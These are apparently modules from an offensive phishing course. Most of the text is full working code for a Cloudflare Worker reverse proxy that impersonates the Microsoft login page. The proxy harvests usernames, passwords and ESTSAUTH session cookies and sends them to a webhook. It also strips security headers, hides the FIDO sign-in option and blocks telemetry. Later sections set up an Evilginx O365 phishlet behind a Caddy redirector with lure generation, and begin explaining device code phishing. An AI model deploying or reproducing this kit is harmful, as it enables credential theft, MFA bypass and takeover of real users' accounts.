Lastly, several array constants are defined: `DOMAIN_PATTERNS`, `MODIFIABLE_CONTENT_TYPES`, `TELEMETRY_PATTERNS`, and `TELEMETRY_REPLACEMENTS`, which contain regular expressions for domain matching, supported content types for modification, telemetry-related domains to block, and replacement patterns for removing or neutralizing telemetry URLs.

```
// Configuration constants
const default_auth_target = 'login.microsoftonline.com';
const webhook_url = "";
let last_cookie_sent_timestamp = 0;

// Feature flags
const ENABLE_FIDO_HTML_MODIFICATION = true;
const ENABLE_PHONE_AUTH_MODIFICATION = true;
const ENABLE_WEBHOOK_NOTIFICATIONS = true;

// Access control
const blocked_regions = ["CN", "US"]; // Block China and USA
const blocked_ips = ['0.0.0.0', '127.0.0.1'];

// Cached regex patterns for better performance
const DOMAIN_PATTERNS = {
    msOnline: /login\.microsoftonline\.com/g,
    msAuth: /login\.microsoft\.com/g,
    msOnlineUrl: /https:\/\/login\.microsoftonline\.com/g,
    msAuthUrl: /https:\/\/login\.microsoft\.com/g,
    cdnMsftAuth: /aadcdn\.msftauth\.net/g,
    cdnMsAuth: /aadcdn\.msauth\.net/g,
    cdnMsftAuthUrl: /https:\/\/aadcdn\.msftauth\.net/g,
    cdnMsAuthUrl: /https:\/\/aadcdn\.msauth\.net/g
};

// Content types that support modification
const MODIFIABLE_CONTENT_TYPES = [
    'text/html',
    'application/json',
    'text/javascript',
    'application/javascript',
    'application/x-javascript'
];

// Telemetry patterns for blocking
const TELEMETRY_PATTERNS = [
    'browser.events.data.microsoft.com',
    'mobile.events.data.microsoft.com',
    '.events.data.microsoft.com',
    'aria.microsoft.com',
    'login.live.com',
    'watson'
];

// Telemetry replacement patterns
const TELEMETRY_REPLACEMENTS = [
    [/"https:\/\/[^\.]*\.events\.data\.microsoft\.com[^"]*"/g, '""'],
    [/https:\/\/[^\.]*\.events\.data\.microsoft\.com[^"'\s>]*/g, '""'],
    [/"[^"]*\/telemetry\/[^"]*"/g, '""'],
    [/"[^"]*\/analytics\/[^"]*"/g, '""'],
    [/"[^"]*\/tracking\/[^"]*"/g, '""'],
    [/(<script[^>]*events\.data\.microsoft\.com[^>]*)integrity="[^"]*"/g, '$1'],
    [/(<link[^>]*events\.data\.microsoft\.com[^>]*)integrity="[^"]*"/g, '$1'],
    [/["']([^"']*watson[^"']*\.js)["']/g, '""'],
    [/"https:\/\/[^"]*\.aria\.microsoft\.com[^"]*"/g, '""'],
    [/"https:\/\/[^"]*\.bing\.com\/[^"]*telemetry[^"]*"/g, '""'],
    [/"https:\/\/[^"]*\.msn\.com\/[^"]*analytics[^"]*"/g, '""'],
    [/"https:\/\/[^"]*login\.live\.com[^"]*"/g, '""'],
    [/https:\/\/[^"'\s>]*login\.live\.com[^"'\s>]*/g, '""']
];

```

### Utility Functions
Next, we will walk through the utility functions starting with the `setCorsHeaders` function. This function takes a single parameter, `headers`, and sets permissive CORS headers while removing restrictive security policies to allow cross-origin requests and prevent content security enforcement conflicts.

```
function setCorsHeaders(headers) {
    headers.set('access-control-allow-origin', '*');
    headers.set('access-control-allow-credentials', 'true');
    headers.delete('content-security-policy');
    headers.delete('content-security-policy-report-only');
    headers.delete('clear-site-data');
}

```
The `isModifiableContent` function checks whether the provided `content_type` string matches any value in the `MODIFIABLE_CONTENT_TYPES` array and returns `true` if the content type is one that can be safely modified, or `false` otherwise. Modifiable content types such as `text/html` and `text/javascript` will be subject to transformations whereas non-modifiable content type such as `image/png` will not be transformed or modified.

```
function isModifiableContent(content_type) {
    if (!content_type) return false;
    return MODIFIABLE_CONTENT_TYPES.some(type => content_type.toLowerCase().includes(type));
}

```
The `isTelemetryRequest` function checks whether the given `hostname` or `pathname` contains any of the substrings defined in the `TELEMETRY_PATTERNS` array and returns `true` if a match is found, indicating that the request is related to Microsoft's telemetry. This function will be used to determine if the incoming request is a telemetry-related request and will modify the response to send Microsoft an empty JSON response.

```
function isTelemetryRequest(hostname, pathname) {
    return TELEMETRY_PATTERNS.some(pattern => hostname.includes(pattern) || pathname.includes(pattern));
}

```
The `applyAuthModifications` function updates the provided HTML `content` by conditionally applying authentication-related changes, calling `applyFidoBypass` when FIDO modification is enabled and `applyPhoneAuthPreference` when phone authentication modification is enabled, then returning the modified content.

```
function applyAuthModifications(content) {
    // FIDO modification
    if (ENABLE_FIDO_HTML_MODIFICATION) {
        content = applyFidoBypass(content);
    }
    
    // Phone authentication modification
    if (ENABLE_PHONE_AUTH_MODIFICATION) {
        content = applyPhoneAuthPreference(content);
    }
    
    return content;
}

```
The `applyFidoBypass` function searches the provided HTML `content` for configurations where the `"FidoKey"` authentication method is set as the default, changes that setting to `false` to disable it, and then injects an additional script created by `createFidoRemovalScript` before the closing `</body>` tag, effectively preventing FIDO authentication from being used as the default option.

```
function applyFidoBypass(content) {
    const has_fido_config = /"authMethodId"\s*:\s*"FidoKey"[^}]*"isDefault"\s*:\s*true/.test(content);
    
    if (has_fido_config) {
        content = content.replace(
            /("authMethodId"\s*:\s*"FidoKey"[^}]*"isDefault"\s*:\s*)true/g, 
            '$1false'
        );
        
        const fido_removal_script = createFidoRemovalScript();
        content = content.replace('</body>', fido_removal_script + '</body>');
    }
    
    return content;
}

```
The `createFidoRemovalScript` function returns an inline JavaScript snippet that, when injected, repeatedly searches for and removes any HTML element associated with the FIDO authentication option (identified by `data-value="FidoKey"`), ensuring that the FIDO login method is hidden or disabled once the page loads.

```
function createFidoRemovalScript() {
    return `
        <script>
        (function() {
            function removeFidoElement() {
                const fidoElement = document.querySelector('div[data-value="FidoKey"]');
                if (fidoElement) {
                    fidoElement.parentNode.removeChild(fidoElement);
                } else {
                    setTimeout(removeFidoElement, 500);
                }
            }
            
            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', removeFidoElement);
            } else {
                removeFidoElement();
                setTimeout(removeFidoElement, 1000);
            }
        })();
        </script>
    `;
}

```
The `applyPhoneAuthPreference` function scans the provided `content` for authentication configurations related to Microsoft’s phone app methods, checking whether `"PhoneAppNotification"` or `"PhoneAppOTP"` entries are present with `"isDefault": false`, and modifies them so that the preferred phone authentication method has `"isDefault": true`, effectively making phone-based sign-in the default authentication option.

```
function applyPhoneAuthPreference(content) {
    const has_phone_app_notification = /"authMethodId"\s*:\s*"PhoneAppNotification"[^}]*"isDefault"\s*:\s*false/.test(content);
    const has_phone_app_otp = /"authMethodId"\s*:\s*"PhoneAppOTP"[^}]*"isDefault"\s*:\s*false/.test(content);
    
    if (has_phone_app_notification && has_phone_app_otp) {
        content = content.replace(
            /("authMethodId"\s*:\s*"PhoneAppNotification"[^}]*"isDefault"\s*:\s*)false/g, 
            '$1true'
        );
    } else if (has_phone_app_notification) {
        content = content.replace(
            /("authMethodId"\s*:\s*"PhoneAppNotification"[^}]*"isDefault"\s*:\s*)false/g, 
            '$1true'
        );
    } else if (has_phone_app_otp) {
        content = content.replace(
            /("authMethodId"\s*:\s*"PhoneAppOTP"[^}]*"isDefault"\s*:\s*)false/g, 
            '$1true'
        );
    }
    
    return content;
}

```
The `determineTarget` function examines the request’s `url` and optionally the `referer` to determine which target domain the proxy should use based on whether the request is for a CDN resource or an authentication endpoint. It routes paths beginning with `/cdn/msftauth` to `aadcdn.msftauth.net`, `/cdn/msauth` to `aadcdn.msauth.net`, and for all other requests, selects `login.microsoft.com` if the `referer` contains that domain or falls back to `default_auth_target` for standard authentication requests.

```
function determineTarget(url, referer) {
    // Check if this is a CDN request via our proxy paths
    if (url.pathname.startsWith('/cdn/msftauth')) {
        url.pathname = url.pathname.replace('/cdn/msftauth', '') || '/';
        return { target_domain: 'aadcdn.msftauth.net', is_cdn_request: true };
    }
    
    if (url.pathname.startsWith('/cdn/msauth')) {
        url.pathname = url.pathname.replace('/cdn/msauth', '') || '/';
        return { target_domain: 'aadcdn.msauth.net', is_cdn_request: true };
    }
    
    // Auth request - determine which auth domain to use
    const target_domain = (referer && referer.includes('login.microsoft.com')) 
        ? 'login.microsoft.com' 
        : default_auth_target;
        
    return { target_domain, is_cdn_request: false };
}

```
The `prepareRequestHeaders` function creates a new `Headers` object based on the original request headers, then modifies specific fields so the proxied request appears valid for the target domain. It updates the `Host` header to match the `target_domain`, sets the `Referer` header to point to the proxy’s hostname (`https://${proxy_hostname}`), and returns the modified headers for use in the outgoing request.

- `original_headers` - The original headers from the incoming request.

- `target_domain` - The destination domain the proxy will forward the request to, used to set the correct `Host` header.

- `proxy_hostname` - The hostname of the proxy server itself (i.e. the Cloudflare Worker), used to construct the `Referer` header pointing back to the proxy.

```
function prepareRequestHeaders(original_headers, target_domain, proxy_hostname) {
    const modified_headers = new Headers(original_headers);
    modified_headers.set('Host', target_domain);
    modified_headers.set('Referer', `https://${proxy_hostname}`);
    return modified_headers;
}

```
Finally, the last utility function is the `shouldCaptureAuthCookies` function which checks whether the provided `captured_cookies` string contains both the `ESTSAUTH` and `ESTSAUTHPERSISTENT` cookies, which indicate an authenticated Microsoft session, and returns `true` only if both cookies are present and `ENABLE_WEBHOOK_NOTIFICATIONS` is enabled, signaling that the captured cookies should be sent to the webhook.

```
function shouldCaptureAuthCookies(captured_cookies) {
    return captured_cookies.includes('ESTSAUTH') && 
           captured_cookies.includes('ESTSAUTHPERSISTENT') && 
           ENABLE_WEBHOOK_NOTIFICATIONS;
}

```

### Webhook Functions
The `sendToWebhook` function sends the user metadata, credentials and cookies to a specified webhook URL and handles both success and failure cases. The `message` parameter is the content that's being sent, whereas the `webhook` parameter is the webhook endpoint.

```
async function sendToWebhook(message, webhook) {
    if (!ENABLE_WEBHOOK_NOTIFICATIONS) {
        return new Response('Webhook notifications disabled', { status: 200 });
    }
    
    const payload = { text: message };
  
    try {
        const response = await fetch(webhook, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify(payload)
        });
  
        if (!response.ok) {
            throw new Error('Failed to send message to webhook');
        }
  
        return new Response('Message sent to webhook successfully', { status: 200 });
    } catch (error) {
        return new Response(`Error: ${error.message}`, { status: 500 });
    }
}

```
The `createRequestMetadata` function builds and returns a metadata object describing a client request. It records the current timestamp, client IP address, client region, user agent, and referer, combining them with any extra data provided in the optional `additional` object.

```
function createRequestMetadata(client_ip, client_region, referer, request, additional = {}) {
    return {
        timestamp: new Date().toISOString(),
        clientIP: client_ip,
        clientRegion: client_region,
        userAgent: request.headers.get('user-agent') || 'Unknown',
        referer: referer || 'Direct',
        ...additional
    };
}

```
Lastly the `formatCredentialMessage` and `formatCookieMessage` functions format the captured credentials and cookies in to the appropriate format prior to sending them off to the webhook endpoint.

```
function formatCredentialMessage(credentials, metadata) {
    return `<b>🔐 Microsoft Credentials Captured</b><br><br>` +
        `<b>Username:</b> ${credentials.username || credentials.additionalUsername || 'N/A'}<br>` +
        `<b>Password:</b> ${credentials.password || 'N/A'}<br><br>` +
        `<b>Request Information:</b><br>` +
        `<b>Timestamp:</b> ${metadata.timestamp}<br>` +
        `<b>IP Address:</b> ${metadata.clientIP}<br>` +
        `<b>Region:</b> ${metadata.clientRegion}<br>` +
        `<b>User Agent:</b> ${metadata.userAgent}<br>` +
        `<b>Referrer:</b> ${metadata.referer}<br>`;
}

```

```
function formatCookieMessage(cookies, metadata) {
    const formattedCookies = cookies
        .replace(/;/g, ';<br>')
        .replace(/ESTSAUTH=/g, '<b>ESTSAUTH=</b>')
        .replace(/ESTSAUTHPERSISTENT=/g, '<b>ESTSAUTHPERSISTENT=</b>');
    
    return `<b>🍪 Authentication Cookies Captured</b><br><br>` +
        `${formattedCookies}<br><br>` +
        `<b>Session Information:</b><br>` +
        `<b>Timestamp:</b> ${metadata.timestamp}<br>` +
        `<b>Target URL:</b> ${metadata.url}<br>` +
        `<b>IP Address:</b> ${metadata.clientIP}<br>` +
        `<b>Region:</b> ${metadata.clientRegion}<br>` +
        `<b>User Agent:</b> ${metadata.userAgent}<br>`;
}

```

### Core Functions
The first core function is `handleFaviconRequest`, which specifically handles requests for fetching the Microsoft login portal’s favicon. The function attempts to retrieve the favicon from `https://c.s-microsoft.com/favicon.ico` using the client’s `User-Agent` header, and if successful, returns it with appropriate content type, CORS, and caching headers. If the fetch fails, it provides a minimal fallback ICO file to ensure the request is always served successfully.

```
async function handleFaviconRequest(url, proxy_hostname, request) {
    const microsoftFaviconUrl = 'https://c.s-microsoft.com/favicon.ico';
    
    try {
        const response = await fetch(microsoftFaviconUrl, {
            method: 'GET',
            headers: {
                'User-Agent': request.headers.get('User-Agent') || 'Mozilla/5.0'
            }
        });
        
        if (response.ok) {
            return new Response(response.body, {
                status: response.status,
                headers: {
                    'Content-Type': 'image/x-icon',
                    'Access-Control-Allow-Origin': '*',
                    'Cache-Control': 'public, max-age=86400'
                }
            });
        }
    } catch (error) {
        // Continue to fallback
    }
    
    // Fallback: Return minimal ICO file
    const minimalIco = new Uint8Array([
        0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x10, 0x10, 0x00, 0x00, 0x01, 0x00, 0x20, 0x00, 0x68, 0x04,
        0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x20, 0x00,
        0x00, 0x00, 0x01, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    ]);
    
    return new Response(minimalIco, {
        status: 200,
        headers: {
            'Content-Type': 'image/x-icon',
            'Access-Control-Allow-Origin': '*',
            'Cache-Control': 'public, max-age=86400'
        }
    });
}

```
The next function, `captureCredentials` will clone the incoming HTTP request, extract the form data and then capture the username and password. Besides having the HTTP request as a parameter, the function takes the user's metadata (`client_ip`, `client_region`, and `referer`) as it will call the webhook functions `createRequestMetadata`, `formatCredentialMessage`, `sendToWebhook` to send the data to the webhook endpoint.

```
async function captureCredentials(request, client_ip, client_region, referer) {
    try {
        const cloned_request = request.clone();
        const form_data = await cloned_request.text();
        const form_fields = form_data.split('&');
        let credentials = {};
        
        for (const field of form_fields) {
            const [key, value] = field.split('=');
            if (key === 'login') {
                credentials.username = decodeURIComponent(value.replace(/\+/g, ' '));
            }
            if (key === 'passwd') {
                credentials.password = decodeURIComponent(value.replace(/\+/g, ' '));
            }
            if (key === 'email' || key === 'user' || key === 'username') {
                credentials.additionalUsername = decodeURIComponent(value.replace(/\+/g, ' '));
            }
        }
        
        if ((credentials.username || credentials.additionalUsername) && credentials.password && ENABLE_WEBHOOK_NOTIFICATIONS) {
            const metadata = createRequestMetadata(client_ip, client_region, referer, request);
            const message = formatCredentialMessage(credentials, metadata);
            await sendToWebhook(message, webhook_url);
        }
    } catch (error) {
        // Ignore credential capture errors
    }
}

```
The `removeTelemetryTracking` function filters telemetry content from a response body. It first checks if the provided `content_type` is modifiable using `isModifiableContent`; if not, it returns the original content unchanged.

If the content is modifiable, it iterates through each `[pattern, replacement]` pair in the `TELEMETRY_REPLACEMENTS` array and applies them sequentially with `String.replace`, removing or neutralizing Microsoft's telemetry and tracking URLs before returning the cleaned content.

```
function removeTelemetryTracking(content, content_type) {
    if (!isModifiableContent(content_type)) {
        return content;
    }
    
    return TELEMETRY_REPLACEMENTS.reduce((text, [pattern, replacement]) => 
        text.replace(pattern, replacement), content
    );
}

```
The `applyUrlRewriting` function replaces all instances of Microsoft authentication and CDN domains within the provided `content` string with equivalent paths pointing to the specified `proxy_domain`, ensuring that subsequent resource and authentication requests are routed through the proxy instead of directly to Microsoft endpoints.

```
function applyUrlRewriting(content, proxy_domain) {
    return content
        .replace(DOMAIN_PATTERNS.msOnlineUrl, `https://${proxy_domain}`)
        .replace(DOMAIN_PATTERNS.msAuthUrl, `https://${proxy_domain}`)
        .replace(DOMAIN_PATTERNS.msOnline, proxy_domain)
        .replace(DOMAIN_PATTERNS.msAuth, proxy_domain)
        .replace(DOMAIN_PATTERNS.cdnMsftAuthUrl, `https://${proxy_domain}/cdn/msftauth`)
        .replace(DOMAIN_PATTERNS.cdnMsAuthUrl, `https://${proxy_domain}/cdn/msauth`)
        .replace(DOMAIN_PATTERNS.cdnMsftAuth, `${proxy_domain}/cdn/msftauth`)
        .replace(DOMAIN_PATTERNS.cdnMsAuth, `${proxy_domain}/cdn/msauth`);
}

```
The `processResponse` function manages how the proxy processes and returns a modified response to the client. It begins by cloning the original response headers into `modified_headers` and initializing a variable for any captured cookies. It then applies CORS headers using `setCorsHeaders`, ensuring cross-origin access. If the request is not for CDN content, it handles authentication cookies via `handleCookies`.

Next, it transforms the response body using `transformContent` to apply URL rewriting, telemetry removal, and authentication-related modifications. If authentication cookies were captured and meet the conditions defined by `shouldCaptureAuthCookies`, it triggers `captureAuthCookies` to send them to a webhook. Finally, it returns a new `Response` object containing the modified content, updated headers, and the original response status.

```
async function processResponse(response, target_domain, proxy_hostname, client_ip, client_region, referer, request, is_cdn_request) {
    const modified_headers = new Headers(response.headers);
    let captured_cookies = "";
    
    // Set CORS headers (always)
    setCorsHeaders(modified_headers);

    // Handle cookies (only for auth requests)
    if (!is_cdn_request) {
        captured_cookies = handleCookies(response, modified_headers, proxy_hostname);
    }

    // Process content
    const content = await transformContent(response, target_domain, proxy_hostname);

    // Capture authentication cookies (only for auth requests)
    if (!is_cdn_request && shouldCaptureAuthCookies(captured_cookies)) {
        await captureAuthCookies(captured_cookies, client_ip, client_region, referer, request, response);
    }

    return new Response(content, {
        status: response.status,
        headers: modified_headers
    });
}

```
The `transformContent` function reads the response body as text, determines its content type, strips telemetry and tracking data, rewrites URLs to route through the proxy, removes integrity attributes from modified resources, and applies authentication-related changes such as FIDO or phone auth adjustments before returning the final processed content.

```
async function transformContent(response, target_domain, proxy_domain) {
    let content = await response.text();
    const content_type = response.headers.get('content-type') || '';
    
    // Always apply telemetry blocking first
    content = removeTelemetryTracking(content, content_type);
    
    // Apply URL rewriting and related transformations if content is modifiable
    if (isModifiableContent(content_type)) {
        content = applyUrlRewriting(content, proxy_domain);
        content = removeIntegrityFromRewrittenResources(content, proxy_domain);
    }
    
    // Apply authentication modifications
    content = applyAuthModifications(content);
    
    return content;
}

```
The `handleCookies` function retrieves all `Set-Cookie` headers from the target server’s response, deletes the originals, rewrites each cookie’s domain to match the proxy hostname so they bind correctly to the proxy, reattaches the modified cookies to the outgoing response, and returns the original cookies as a concatenated string for potential capture or logging.

```
function handleCookies(response, modified_headers, proxy_hostname) {
    try {
        const original_cookies = response.headers.getAll("Set-Cookie");
        const captured_cookies = original_cookies.join("; ");

        // Clear and modify cookies
        original_cookies.forEach(() => modified_headers.delete("Set-Cookie"));
        original_cookies.forEach(cookie => {
            // Apply URL rewriting to cookies (always enabled)
            const modified_cookie = cookie
                .replace(DOMAIN_PATTERNS.msOnline, proxy_hostname)
                .replace(DOMAIN_PATTERNS.msAuth, proxy_hostname);
            
            modified_headers.append("Set-Cookie", modified_cookie);
        });
        
        return captured_cookies;
    } catch (error) {
        return "";
    }
}

```
The `captureAuthCookies` function monitors for captured authentication cookies, enforces a five-second throttle to prevent repeated transmissions, generates metadata (IP, region, referer, and URL), formats the data into a webhook message, and sends it to the configured webhook endpoint if cookie capture is enabled.

```
async function captureAuthCookies(captured_cookies, client_ip, client_region, referer, request, response) {
    const current_time = Date.now();
    if (current_time - last_cookie_sent_timestamp > 5000) {
        const metadata = createRequestMetadata(client_ip, client_region, referer, request, {
            url: response.url
        });
        
        const message = formatCookieMessage(captured_cookies, metadata);
        await sendToWebhook(message, webhook_url);
        last_cookie_sent_timestamp = current_time;
    }
}

```
The `forwardRequest` function sends the user’s request to the Microsoft target domain with modified headers, manages up to five manual redirect hops, rewrites any Microsoft login redirects so they point back through the proxy instead of directly to Microsoft, and returns the final response for further processing.

```
async function forwardRequest(url, request, headers, proxy_hostname) {
    let target_response = await fetch(url.href, {
        method: request.method,
        headers: headers,
        body: request.body,
        redirect: 'manual'
    });

    // Handle Microsoft's redirect chain manually
    let redirect_count = 0;
    const max_redirects = 5;
    
    while (target_response.status >= 300 && target_response.status < 400 && redirect_count < max_redirects) {
        const location = target_response.headers.get('Location');
        if (!location) break;
        
        redirect_count++;
        
        // If redirect points to Microsoft auth domain, rewrite and send to browser
        if (location.includes('login.microsoftonline.com') || location.includes('login.microsoft.com')) {
            const modified_location = location
                .replace(DOMAIN_PATTERNS.msOnlineUrl, `https://${proxy_hostname}`)
                .replace(DOMAIN_PATTERNS.msAuthUrl, `https://${proxy_hostname}`);
            
            return new Response('', {
                status: 302,
                headers: {
                    'Location': modified_location,
                    'Cache-Control': 'no-cache'
                }
            });
        }
        
        // Follow the redirect
        target_response = await fetch(location, {
            method: 'GET',
            headers: {
                'User-Agent': request.headers.get('User-Agent') || 'Mozilla/5.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': request.headers.get('Accept-Language') || 'en-US,en;q=0.5'
            },
            redirect: 'manual'
        });
    }
    
    return target_response;
}

```
The `processRequest` function acts as the main controller for every incoming HTTP request, blocking telemetry domains immediately, collecting client IP, region, and referer information, enforcing access restrictions, handling favicon requests separately, determining whether the request is for a CDN or authentication endpoint, and preparing appropriate headers. It will also attempt to capture credentials and forward the request to the target domain, and finally it processes and returns the modified response to the client.

```
async function processRequest(request) {
    const url = new URL(request.url);
    const hostname = url.hostname.toLowerCase();
    
    // Block telemetry requests directly (highest priority)
    if (isTelemetryRequest(hostname, url.pathname)) {
        return new Response('{}', {
            status: 200,
            headers: {
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*',
                'Cache-Control': 'no-cache'
            }
        });
    }
    
    // Extract client information
    const client_region = request.headers.get('cf-ipcountry')?.toUpperCase() || '';
    const client_ip = request.headers.get('cf-connecting-ip') || '';
    const referer = request.headers.get('referer');
    
    // Access control checks
    if (blocked_regions.includes(client_region) || blocked_ips.includes(client_ip)) {
        return new Response('Access denied', { status: 403 });
    }

    // Special handling for favicon requests
    if (url.pathname.endsWith('.ico') || url.pathname.includes('favicon')) {
        return handleFaviconRequest(url, hostname, request);
    }

    // Determine target domain and request type
    const { target_domain, is_cdn_request } = determineTarget(url, referer);
    
    // Update URL for target
    url.protocol = 'https:';
    url.host = target_domain;

    // Prepare request headers
    const modified_headers = prepareRequestHeaders(request.headers, target_domain, hostname);

    // Handle credentials capture for POST requests (only for auth domains)
    if (request.method === 'POST' && !is_cdn_request) {
        await captureCredentials(request, client_ip, client_region, referer);
    }

    // Forward request and handle redirects
    const target_response = await forwardRequest(url, request, modified_headers, hostname);

    // Handle WebSocket upgrade
    if (request.headers.get("Upgrade")?.toLowerCase() === "websocket") {
        return target_response;
    }

    // Process response based on type
    return processResponse(target_response, target_domain, hostname, client_ip, client_region, referer, request, is_cdn_request);
}

```

## Demo
For the demo, create a Cloudflare worker, paste the provided module code (`index.js`) and press "Deploy" then visit the Worker link.

Make sure to update the `webhook_url` variable with your webhook endpoint. Create a testing endpoint at Webhook.site

Next, authenticate using a Microsoft account and enter both password and MFA code.

Check your webhook endpoint, it should receive two webhooks for the captured credentials and cookie.

## Credits
Huge thank you to cgomez. This module would not be possible without him.

## Objectives
Create a function that performs additional anti-analysis and anti-bot checks. Run the function at the start of the main event listener

Modify the existing code to proxy target domain of your choice


---

# Novo Módulo 17 — Protegendo Servidor Evilginx via Caddy

Novo Módulo 17 — Protegendo Servidor Evilginx via Caddy

# Disclaimer

# Module 17 - Protecting Evilginx Server Via Caddy

## Introduction
Throughout this course, we've highlighted the importance of protecting the phishing server by placing a redirector in front of it. When protecting an Evilginx instance, the process is slightly different from that of a regular phishing server. In this module, we will demonstrate how to configure an Evilginx instance and a Caddy instance to successfully protect the Evilginx server.

## Prerequisites
To start, we will need to have two virtual private servers (VPS) and a domain name. The first VPS will need to have Caddy installed which has previously been covered in the course, specifically in Module 35: Introduction To Caddy. The second VPS will need to have Evilginx installed. This module will use the opsec Evilginx binary available in Module 79: Customizing Evilginx: Opsec Configuration.

The DNS records for the domain name will be discussed later in this module.

## Configuring Evilginx
Start by configuring Evilginx's global configuration, specifically `ipv4` and `domain`. Set the `pv4` to the IP address of the Evilginx VPS and set the `domain` to be your domain name.

```
config ipv4 <evilginx-vps-ip>

config domain <your-domain.com>

```
Furthermore, we will need to disable auto certificate generation as the SSL certificate will be dealt with in the Caddy server.

```
config autocert off

```

In this module, we are using the provided O365 phishlet we can therefore prepare the phishlet by configuring the hostname, blacklisting unauthorized access and enabling the phishlet.

Reminder: Make sure you've permitted HTTP/HTTPS traffic using `ufw allow http` and `ufw allow https`.

```
phishlets hostname o365 <your-domain.com>

blacklist unauth

phishlets enable o365

```

## Configuring Caddy
The next step is to configure Caddy to successfully reverse proxy the Evilginx server. Start by requesting a wildcard SSL certificate for the domain name that was configured in the Evilginx server (i.e. the domain name in `config domain <your-domain.com>`) and complete the DNS challenge by setting the TXT record.

```
sudo apt install certbot

# Request wildcard cert
sudo certbot certonly --manual --preferred-challenges=dns -d *.your-domain.com

```

Once the certificate is generated, create a directory named `/etc/caddy/ssl` and move the wildcard certificate and private key to the directory. Finally, ensure that ownership of the directory and all its contents is owned by the `caddy` user.

```
mkdir /etc/caddy/ssl

# Replace your-domain with the domain name
mv /etc/letsencrypt/archive/your-domain.com/fullchain1.pem /etc/caddy/ssl/fullchain1.pem
mv /etc/letsencrypt/archive/your-domain.com/privkey.pem /etc/caddy/ssl/privkey.pem 

# Change ownership
cd /etc/caddy/ssl
chown -R caddy:caddy .

# Reload Caddy
systemctl reload caddy

```
Next, the `/etc/caddy/Caddyfile` needs to be created to define a wildcard host for the `*.<your-domain>.com` domain and specify the SSL certificate and private key locations. Next, define a reverse proxy directive to forward incoming requests for the wildcard domain to the backend Evilginx instance. This section tells Caddy to use the specified SSL certificates, then route all requests for `*.<your-domain>.com` to `https://evilginx-ip-address`.

The `tls_server_name {host}` directive is required when the upstream server is an IP address, as per Caddy's documentation: You only need to override this if your upstream address does not match the certificate the upstream is likely to use. For example if the upstream address is an IP address, then you would need to configure this to the hostname being served by the upstream server.

This directive ensures that Caddy uses the client’s requested hostname as the Server Name Indication (SNI) during the TLS handshake so the backend presents the correct certificate. On the other hand, the `header_up Host {host}` forwards the original `Host` header to the backend so it receives the real requested domain instead of the proxy’s address.

The full Caddy configuration is shown below.

```
*.your-domain.com { # UPDATE
    # Certificate
    tls /etc/caddy/ssl/fullchain.pem /etc/caddy/ssl/privkey.pem

    # Reverse proxy the Evilginx instance
    reverse_proxy https://evilginx-ip-address { # UPDATE
        transport http {
            # This makes the TLS handshake with the backend succeed
            tls_server_name {host}
        }
        	header_up Host {host}
    }
}

```
Once the configuration is saved make sure to reload Caddy using `systemctl reload caddy`.

## Configuring DNS Records
The final part to making the configuration work correctly is to set the DNS A records that are required by the Evilginx phishlet. Recall that the phishlet has the following configuration:

```
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'aadcdn', orig_sub: 'login', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}

```
Where we would need to create DNS A records for the primary domain (i.e. `<your-domain>.com`) and the `login`, `www`, and `aadcdn` subdomains. The main difference in this setup is that the DNS A records should point to the Caddy server's IP address instead of the Evilginx server's IP address.

## Demo
To demonstrate that Evilginx is now protected with Caddy, we will update the `Caddyfile` configuration to redirect user agents with the term "Firefox" to `example.com`.

```
*.your-domain.com {
    # Certificate
    tls /etc/caddy/ssl/fullchain.pem /etc/caddy/ssl/privkey.pem

    @blocked_ua {
    	header User-Agent *Firefox*
    }

    handle @blocked_ua {
    	redir https://example.com
    }
    
    reverse_proxy https://45.32.219.222 {
        transport http {
            # This makes the TLS handshake with the backend succeed
            tls_server_name {host}
        }
        #header_up Host login.notthathealthy.com
        header_up Host {host}
    }
}

```
Reload Caddy and switch to the Evilginx server to generate a lure.

```
lures create o365

lures get-url <id>

```
Access the lure using Firefox and another browser. If Caddy is protecting the Evilginx server correctly, it will redirect the Firefox browser to `example.com` but will allow other browsers.

The video can be found in folder: `./videos/demo-evilginx-protection.mov`

## Credits
Huge shout out to @Electroxero as this module would not be possible without him.

## Objectives
Protect an Evilginx instance with a reverse proxy of your choice (e.g. Caddy, Nginx etc.)

Check the domain's JARM and JA4S fingerprints before and after protecting it with a reverse proxy


---

# Novo Módulo 18 — Phishing via Device Code Microsoft

Novo Módulo 18 — Phishing via Device Code Microsoft

- # Novo Módulo 18 — Phishing via Device Code Microsoft

# Disclaimer
# Module 18 - Microsoft Device Code Phishing

## Introduction
Device Authorization Grant also known as Device Code Flow is an OAuth 2.0 protocol designed for devices with limited input capabilities such as Smart TVs, IoT devices and command-line tools. This flow allows users to authenticate by entering a code on a separate device with a browser (e.g. on your laptop or phone), thereby enabling secure access without requiring direct credential entry on the limited device.Microsoft’s authentication system includes support for the device code flow, as outlined in their official documentation. However, this support also introduces the risk of Device Code Phishing, a technique that exploits Microsoft’s OAuth 2.0 device code authentication flow to obtain authentication tokens and gain access to a target user’s account.In this module, we will explore the OAuth 2.0 device code flow, its legitimate use cases and examine how attackers abuse this flow to compromise accounts. We will also carry out a full device code phishing attack using TokenTacticsV2 and leverage GraphSpy for deeper token analysis and data extraction.
## OAuth 2.0
Before diving into device code phishing, we must understand the underlying protocol. OAuth 2.0 is an authorization framework that allows third party applications to access user resources without needing to handle or store passwords. Instead of sharing credentials, users grant applications a scoped "digital key" that provides only the specific permissions required, improving both security and user control. The primary components of OAuth 2.0 are:
Resource Owner: The user or entity that owns the data and grants access to it.

- Client: The application requesting access to the resource owner’s data on their behalf.

